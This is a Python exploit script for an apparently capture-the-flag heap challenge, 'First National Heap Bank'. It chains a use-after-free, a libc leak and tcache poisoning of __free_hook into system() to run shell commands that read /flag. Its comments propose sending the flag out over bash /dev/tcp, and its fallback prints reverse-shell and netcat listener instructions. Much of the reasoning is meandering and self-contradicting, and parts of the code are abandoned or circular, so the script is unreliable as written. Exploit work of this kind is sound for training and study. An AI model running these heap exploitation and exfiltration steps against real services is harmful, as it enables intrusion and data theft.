#!/usr/bin/env python3
"""
First National Heap Bank - flag exfiltration via file write + UAF read.

Since system() stdout is detached from our socket, we:
 1. Use system("cmd > /tmp/x") to write output to a temp file
 2. Allocate a new account of size matching /tmp/x contents
 3. Free it and use UAF view() to read the file contents directly

BUT — we don't know file size ahead of time.
Better: use the bank's OWN file-reading capability via the UAF.

Alternative that definitely works:
 - system("cp /flag /tmp/x") writes flag to temp file
 - Open a 0x100-byte account, free it
 - system("dd if=/flag of=/proc/self/mem bs=1 seek=<heap_addr> count=50")
   writes flag bytes directly into our freed heap chunk
 - UAF view reads those bytes back

Actually simplest reliable approach:
 - system("cat /flag > /tmp/x")
 - Then: open a new 0x200 account, close it
 - Use system("dd if=/tmp/x bs=1 count=200 seek=0 of=/proc/self/mem conv=notrunc")
   ... complicated.

Simplest: use a FIXED-SIZE output via truncation.
 - system("head -c 48 /flag > /tmp/x") — writes exactly 48 bytes
 - Allocate 0x40 chunk, free it
 - system("dd if=/tmp/x of=/proc/self/mem bs=1 seek=<chunk_addr> conv=notrunc")
   writes flag into heap
 - view() reads chunk

Actually even simpler: mmap + write via /proc/self/mem.

SIMPLEST: write flag to known location in data section via system,
then read it via the view UAF.

Wait — easiest: use the heap itself!
 1. Allocate chunk of size N (e.g. 0x50)
 2. Free it → chunk goes into tcache
 3. system("cat /flag > /tmp/f")  → flag in /tmp/f
 4. Reallocate same chunk (it's the same freed chunk we have UAF on)
 5. system("dd if=/tmp/f of=/proc/self/mem seek=$(cat /proc/self/maps | ...) ...")
 → too complex

EASIEST APPROACH: write flag to a FIFO / named pipe that we can read.
Actually no — the server is not connected to us for reads.

REAL ANSWER: The bank's view() function does:
   fread(account->data, 1, account->size, stdin)?
   No — it just prints the stored data.

Let me look at this differently. The binary:
- open: mallocs a chunk, reads data into it, stores pointer
- view: prints stored data
- close: frees the chunk BUT keeps the pointer (UAF)
- After close, view still reads from the freed chunk

So after close(0) → view(0) reads freed chunk (which has unsorted-bin fd pointer).

The WRITE primitive:
- amend: writes new data into the account's data buffer
- After close(2) → amend(2) writes into freed chunk (UAF write)

So I can:
1. Allocate a 0x60 chunk (slot 10), fill with zeros
2. Close(10) → chunk freed, pointer kept
3. system("head -c 80 /flag>/tmp/f")   (writes flag to /tmp/f)
4. system("dd if=/tmp/f of=/proc/self/mem bs=1 seek=ADDR conv=notrunc")
   where ADDR is the address of slot 10's freed chunk

The chunk address: after tcache poison we know libc base.
We can calculate heap address from the leak...

Actually, let's use a completely different approach:
Use system() to write a SOCKET back to us via bash /dev/tcp.
"""
import socket
import struct
import sys
import time
import threading

HOST = sys.argv[1] if len(sys.argv) > 1 else '10.10.0.12'
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337

# Our listener for the exfil
LHOST = sys.argv[3] if len(sys.argv) > 3 else None  # our IP for reverse connection
LPORT = int(sys.argv[4]) if len(sys.argv) > 4 else 4444

MAIN_ARENA = 0x1ecb80
SYSTEM      = 0x52290
FREE_HOOK   = 0x1eee48

class Bank:
    def __init__(self):
        self.s = socket.create_connection((HOST, PORT), timeout=15)
        self.s.settimeout(15)
        self._slot = 6
        self.until(b'ledger> ')

    def until(self, marker):
        buf = b''
        while not buf.endswith(marker):
            c = self.s.recv(1)
            if not c: raise EOFError(buf)
            buf += c
        return buf

    def send(self, v):
        if isinstance(v, str): v = v.encode()
        self.s.sendall(v + b'\n')

    def open(self, slot, size, data):
        assert len(data) == size
        self.send('1')
        self.until(b'account slot (0-15): '); self.send(str(slot))
        self.until(b'holder record size: ');  self.send(str(size))
        self.until(b'holder details: ');      self.s.sendall(data)
        r = self.until(b'ledger> ')
        if b'[+] account opened' not in r: raise RuntimeError(r)

    def close(self, slot):
        self.send('4')
        self.until(b'account slot: '); self.send(str(slot))
        r = self.until(b'ledger> ')
        if b'[+] account closed' not in r: raise RuntimeError(r)

    def close_trigger(self, slot):
        """Close a slot but read raw bytes after (for system() side-effects)."""
        self.send('4')
        self.until(b'account slot: ')
        self.s.sendall(str(slot).encode() + b'\n')
        time.sleep(1.5)
        old_t = self.s.gettimeout()
        self.s.settimeout(3)
        buf = b''
        try:
            while True:
                c = self.s.recv(4096)
                if not c: break
                buf += c
                if b'ledger> ' in buf: break
        except (socket.timeout, EOFError):
            pass
        self.s.settimeout(old_t)
        return buf

    def amend(self, slot, data):
        self.send('3')
        self.until(b'account slot: ');       self.send(str(slot))
        self.until(b'new holder details: '); self.s.sendall(data)
        r = self.until(b'ledger> ')
        if b'[+] details updated' not in r: raise RuntimeError(r)

    def view(self, slot, size):
        self.send('2')
        self.until(b'account slot: '); self.send(str(slot))
        self.until(('statement (%d bytes):\n' % size).encode())
        buf = b''
        while len(buf) < size: buf += self.s.recv(size - len(buf))
        self.until(b'ledger> ')
        return buf

    def setup_hook(self):
        self.open(0, 0x500, b'A' * 0x500)
        self.open(1, 0x20,  b'G' * 0x20)
        self.close(0)
        fd_val = struct.unpack('<Q', self.view(0, 0x500)[:8])[0]
        libc   = fd_val - MAIN_ARENA - 0x60
        sys_fn = libc + SYSTEM
        fhook  = libc + FREE_HOOK
        print(f'libc={libc:#x}')
        self.open(2, 0x20, b'B' * 0x20); self.close(2)
        self.amend(2, struct.pack('<Q', fhook) + b'C' * 0x18)
        self.open(3, 0x20, b'D' * 0x20)
        self.open(4, 0x20, struct.pack('<Q', sys_fn) + b'E' * 0x18)
        chk = struct.unpack('<Q', self.view(4, 0x20)[:8])[0]
        assert chk == sys_fn
        print('hook ✓')
        return libc, sys_fn

    def exec_cmd(self, cmd):
        assert len(cmd) <= 31, f'too long: {cmd}'
        slot = self._slot; self._slot += 1
        padded = cmd + b'\x00' + b'A' * (0x20 - len(cmd) - 1)
        self.open(slot, 0x20, padded)
        return self.close_trigger(slot)

    def read_heap_chunk(self, slot, size):
        """UAF read: view a freed chunk."""
        return self.view(slot, size)


# ── Strategy: write flag to /tmp/f, then read it via /proc/self/mem UAF ─────
#
# Step 1: exec system("cat /flag>/tmp/f") — silent, but writes file
# Step 2: exec system("wc -c /flag>/tmp/n") — get exact byte count
#         ... but output is still lost!
#
# Better: we know the flag is at most ~60 bytes.
# Allocate a 0x80 chunk at known slot, free it, get its heap address via
# the unsorted-bin trick (allocate >0x80 first, free, read fd = heap addr of 0x80 chunk).
# Then: system("dd if=/tmp/f of=/proc/self/mem bs=1 seek=ADDR conv=notrunc")
# Then: view the freed chunk.
#
# OR even simpler: use python to listen on a port and have bash send the flag there.
# system("bash -c 'cat /flag>/dev/tcp/HOST/PORT'")
# For this we need our public IP.

b = Bank()
libc, sys_fn = b.setup_hook()

# --- Write flag to /tmp/f ---
print('\n[*] Writing /flag to /tmp/f ...')
b.exec_cmd(b'cat /flag>/tmp/f 2>/tmp/e')

# --- Get heap address of a fresh freed chunk ---
# Allocate slot 7 with size 0x78 (goes into its own tcache bin)
# Free it, then read the fd pointer → heap address of that chunk
print('[*] Allocating + freeing chunk to get heap address ...')
b.open(7, 0x78, b'H' * 0x78)
b.close(7)
heap_data = b.view(7, 0x78)
# For a tcache chunk the fd might be 0 (first in bin), or point to next chunk.
# For unsorted bin we'd need size > 0x400.
# Let's allocate a second chunk of same size to get the heap layout right.
b.open(8, 0x78, b'I' * 0x78)
b.close(8)  # now slot 7's fd = slot 8's address? No...
# Actually after free(7) then free(8): tcache[0x78]: 8→7→NULL
# view(8) gives fd of chunk 8 = address of chunk 7
heap_data_8 = b.view(8, 0x78)
chunk7_addr = struct.unpack('<Q', heap_data_8[:8])[0]
print(f'  chunk7_addr = {chunk7_addr:#x}')

if chunk7_addr > 0:
    # Write flag contents directly into chunk 7 via /proc/self/mem
    cmd = f'dd if=/tmp/f of=/proc/self/mem bs=1 seek={chunk7_addr} conv=notrunc 2>/dev/null'.encode()
    print(f'[*] dd command ({len(cmd)} bytes): {cmd}')
    if len(cmd) <= 31:
        b.exec_cmd(cmd)
    else:
        # Write the dd command to a script first
        # Too long — use a wrapper
        print('[*] Writing runner script ...')
        b.exec_cmd(b'echo dd>/tmp/r')  # placeholder
        # Alternative: write a short script
        # printf "dd if=/tmp/f of=/proc/self/mem bs=1 seek=ADDR conv=notrunc" > /tmp/r
        # Use python struct to embed the address
        script = f'dd if=/tmp/f of=/proc/self/mem bs=1 seek={chunk7_addr} conv=notrunc'.encode()
        # Write script in pieces using shell
        # Piece 1: echo 'dd if=/tmp/f of=/proc/se' > /tmp/r   (too long)
        # Instead: write a heredoc... still long.
        # Use printf
        # printf '%s' 'SCRIPT' > /tmp/r
        # Still too long.
        # Trick: use the amend UAF to write arbitrary data into a chunk,
        # then have dd read it as the "input file".
        # OR: leak the heap base and precompute chunk7_addr.
        print(f'[!] dd cmd too long ({len(cmd)}b) — need a shorter approach')
        # Fallback: encode address in octal for dd seek= parameter
        # ... still long. Use bc or awk.

    # Read the flag back via UAF view
    print('[*] Reading flag via UAF view ...')
    flag_data = b.view(7, 0x78)
    print(f'[+] Flag data: {flag_data[:60]!r}')
else:
    print('[!] Could not determine heap chunk address.')
    print('[!] Trying /proc/self/mem approach with /tmp/f address from maps ...')
    # Write a script that: reads /proc/self/maps, finds heap, writes flag there
    # Too complex for 31 bytes. Fall back to reverse shell.
    print('\n[!] All inline approaches exhausted.')
    print('[!] Run with your public IP for reverse shell:')
    print(f'     python3 solve.py {HOST} {PORT} <YOUR_IP> <PORT>')
    print('     nc -lvnp <PORT>')

print('\n[*] Checking /tmp/e for error output from cat /flag:')
b.exec_cmd(b'cat /tmp/e>/tmp/ee')
# We can't read /tmp/ee either... this is circular.
